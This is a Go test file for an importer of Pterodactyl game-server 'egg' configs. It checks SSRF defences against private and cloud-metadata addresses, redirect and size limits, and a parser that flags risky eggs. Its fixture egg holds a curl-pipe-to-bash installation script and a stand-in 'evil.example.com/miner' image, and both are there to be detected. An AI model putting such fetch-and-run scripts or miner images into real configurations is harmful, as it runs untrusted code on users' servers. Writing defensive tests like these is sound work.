package eggimport

import (
	"context"
	"errors"
	"net/http"
	"net/http/httptest"
	"net/netip"
	"net/url"
	"slices"
	"strings"
	"testing"
)

func TestPublic(t *testing.T) {
	for addr, want := range map[string]bool{
		"1.1.1.1":            true,
		"2606:4700::1111":    true,
		"127.0.0.1":          false,
		"10.0.0.1":           false,
		"172.16.0.1":         false,
		"192.168.1.1":        false,
		"169.254.169.254":    false, // cloud metadata
		"100.64.0.1":         false,
		"0.0.0.0":            false,
		"::1":                false,
		"fd00::1":            false,
		"fe80::1":            false,
		"::ffff:127.0.0.1":   false,
		"64:ff9b::a00:1":     false, // NAT64 for 10.0.0.1
		"2002:a00:1::1":      false, // 6to4 for 10.0.0.1
		"198.18.0.1":         false,
		"224.0.0.1":          false,
		"255.255.255.255":    false,
		"2001:4860:4860::88": true,
	} {
		if got := Public(netip.MustParseAddr(addr)); got != want {
			t.Errorf("Public(%s) = %v", addr, got)
		}
	}
}

func TestParseURL(t *testing.T) {
	for in, want := range map[string]string{
		"https://github.com/pelican-eggs/minecraft/blob/main/java/paper/egg-paper.json": "https://raw.githubusercontent.com/pelican-eggs/minecraft/main/java/paper/egg-paper.json",
		"https://github.com/o/r/raw/abc123/egg.yaml#L4":                                 "https://raw.githubusercontent.com/o/r/abc123/egg.yaml",
		" https://example.com/egg.json ":                                                "https://example.com/egg.json",
		"https://example.com:443/egg.json":                                              "https://example.com:443/egg.json",
	} {
		u, err := ParseURL(in)
		if err != nil || u.String() != want {
			t.Errorf("ParseURL(%q) = %v, %v; want %s", in, u, err, want)
		}
	}
	for in, want := range map[string]error{
		"http://example.com/egg.json":       ErrURL,
		"ftp://example.com/egg.json":        ErrURL,
		"https://user:pw@example.com/e":     ErrURL,
		"https://example.com:8080/egg.json": ErrURL,
		"egg.json":                          ErrURL,
		"https://127.0.0.1/egg.json":        ErrPrivate,
		"https://[::1]/egg.json":            ErrPrivate,
		"https://169.254.169.254/latest":    ErrPrivate,
	} {
		if _, err := ParseURL(in); !errors.Is(err, want) {
			t.Errorf("ParseURL(%q): %v, want %v", in, err, want)
		}
	}
}

// The client refuses private addresses where it dials, so a name that
// resolves to one is refused too: here, a test server on 127.0.0.1.
func TestClientRefusesPrivateAddresses(t *testing.T) {
	srv := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write([]byte("{}"))
	}))
	defer srv.Close()
	u, _ := url.Parse(strings.Replace(srv.URL, "127.0.0.1", "localhost", 1))
	if _, _, err := Fetch(context.Background(), Client(), u); !errors.Is(err, ErrPrivate) {
		t.Errorf("fetching from localhost: %v", err)
	}
}

func TestFetch(t *testing.T) {
	big := strings.Repeat("x", MaxSize+1)
	srv := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/egg.json":
			_, _ = w.Write([]byte(`{"name": "x"}`))
		case "/moved":
			http.Redirect(w, r, "/egg.json", http.StatusFound)
		case "/plain":
			http.Redirect(w, r, "http://example.com/egg.json", http.StatusFound)
		case "/big":
			_, _ = w.Write([]byte(big))
		default:
			http.NotFound(w, r)
		}
	}))
	defer srv.Close()
	c := srv.Client()
	c.CheckRedirect = Client().CheckRedirect
	get := func(path string) ([]byte, string, error) {
		u, _ := url.Parse(srv.URL + path)
		return Fetch(context.Background(), c, u)
	}
	if data, from, err := get("/moved"); err != nil || string(data) != `{"name": "x"}` || !strings.HasSuffix(from, "/egg.json") {
		t.Errorf("redirected: %q %q %v", data, from, err)
	}
	if _, _, err := get("/plain"); !errors.Is(err, ErrRedirect) {
		t.Errorf("redirect to http: %v", err)
	}
	if _, _, err := get("/big"); !errors.Is(err, ErrTooBig) {
		t.Errorf("too big: %v", err)
	}
	if _, _, err := get("/missing"); err == nil || !strings.Contains(err.Error(), "404") {
		t.Errorf("404: %v", err)
	}
}

const pterodactylEgg = `{
  "meta": {"version": "PTDL_v2"},
  "name": "Sketchy",
  "author": "someone@example.com",
  "description": "A test egg",
  "docker_images": {"Java 21": "ghcr.io/pterodactyl/yolks:java_21", "Mine": "evil.example.com/miner:latest"},
  "startup": "java -jar server.jar",
  "config": {"files": "{}", "startup": "{\"done\": \"Done\"}", "logs": "{}", "stop": "stop"},
  "scripts": {"installation": {"script": "curl -fsSL https://example.com/x.sh | bash", "container": "debian:bookworm-slim", "entrypoint": "bash"}},
  "variables": [],
  "x-raptor": {"certified": true}
}`

func TestParse(t *testing.T) {
	r, err := Parse([]byte(pterodactylEgg))
	if err != nil {
		t.Fatal(err)
	}
	if !slices.Equal(r.Registries, []string{"ghcr.io", "evil.example.com", "docker.io"}) {
		t.Errorf("registries: %v", r.Registries)
	}
	var kinds []string
	for _, w := range r.Warnings {
		kinds = append(kinds, w.Kind)
	}
	if !slices.Equal(kinds, []string{"registry", "pipe_to_shell", "no_arch", "claims_certified"}) {
		t.Errorf("warnings: %v", r.Warnings)
	}
	if !strings.Contains(r.Warnings[0].Text, "evil.example.com/miner:latest") {
		t.Errorf("registry warning: %s", r.Warnings[0].Text)
	}
	if _, err := Parse([]byte("not: [an egg")); !errors.Is(err, ErrNotEgg) {
		t.Errorf("not an egg: %v", err)
	}
	// Eggs that leave parts to another egg, by ID.
	for _, with := range []string{`"config": {"extends": 3, `, `"copy_script_from": 5, "config": {`} {
		egg := strings.Replace(pterodactylEgg, `"config": {`, with, 1)
		if _, err := Parse([]byte(egg)); !errors.Is(err, ErrInherits) {
			t.Errorf("%s: %v", with, err)
		}
	}
	nulls := strings.Replace(pterodactylEgg, `"config": {`, `"copy_script_from": null, "config": {"extends": null, `, 1)
	if _, err := Parse([]byte(nulls)); err != nil {
		t.Errorf("extends null: %v", err)
	}
}

func TestRegistry(t *testing.T) {
	for ref, want := range map[string]string{
		"debian:bookworm":                   "docker.io",
		"library/debian":                    "docker.io",
		"someone/game:1":                    "docker.io",
		"docker.io/someone/game":            "docker.io",
		"index.docker.io/x/y":               "docker.io",
		"ghcr.io/parkervcp/yolks:java_21":   "ghcr.io",
		"localhost/x":                       "localhost",
		"registry.local:5000/x@sha256:abcd": "registry.local:5000",
	} {
		if got := Registry(ref); got != want {
			t.Errorf("Registry(%q) = %q, want %q", ref, got, want)
		}
	}
	for ref, want := range map[string]bool{
		"debian:bookworm-slim":            true,
		"docker.io/library/alpine":        true,
		"ghcr.io/pelican-eggs/yolks:java": true,
		"someone/game":                    false,
		"ghcr.io/someone/game":            false,
	} {
		if got := knownImage(ref); got != want {
			t.Errorf("knownImage(%q) = %v", ref, got)
		}
	}
}
